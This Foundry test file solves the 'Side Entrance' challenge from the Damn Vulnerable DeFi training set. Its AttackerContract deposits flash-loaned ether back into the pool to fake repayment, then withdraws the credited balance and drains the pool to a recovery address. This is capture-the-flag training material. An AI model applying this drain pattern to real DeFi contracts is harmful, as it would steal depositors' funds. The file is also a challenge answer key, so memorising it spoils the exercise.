// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {Test, console, console2} from "forge-std/Test.sol";
import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../src/damn-vuln-defi/SideEntrance.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        uint256 maxWithdraw = 100 ether;
        AttackerContract ac = new AttackerContract(
            player,
            recovery,
            maxWithdraw,
            pool
        );
        for (uint8 i = 0; i < 10; i++) {
            ac.execute{value: player.balance}();
            ac.withdraw(PLAYER_INITIAL_ETH_BALANCE);
        }
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(
            recovery.balance,
            ETHER_IN_POOL,
            "Not enough ETH in recovery account"
        );
    }
}

contract AttackerContract is IFlashLoanEtherReceiver {
    address attacker;
    address recovery;
    uint256 immutable maxWithdraw;
    uint256 withdrawn = 0;
    SideEntranceLenderPool pool;

    constructor(
        address _attacker,
        address _recovery,
        uint256 _maxWithdraw,
        SideEntranceLenderPool _pool
    ) {
        attacker = _attacker;
        recovery = _recovery;
        maxWithdraw = _maxWithdraw;
        pool = _pool;
    }

    receive() external payable {}

    function execute() external payable {
        if (address(pool).balance >= msg.value && withdrawn < maxWithdraw) {
            withdrawn += msg.value;
            pool.flashLoan(msg.value);
        } else {
            pool.deposit{value: withdrawn}();
        }
    }

    function withdraw(uint256 initAmount) external {
        withdrawn = 0;
        pool.withdraw();
        (bool s1, ) = attacker.call{value: initAmount}("");
        (bool s2, ) = recovery.call{value: address(this).balance}("");
        require(s1 && s2);
    }
}
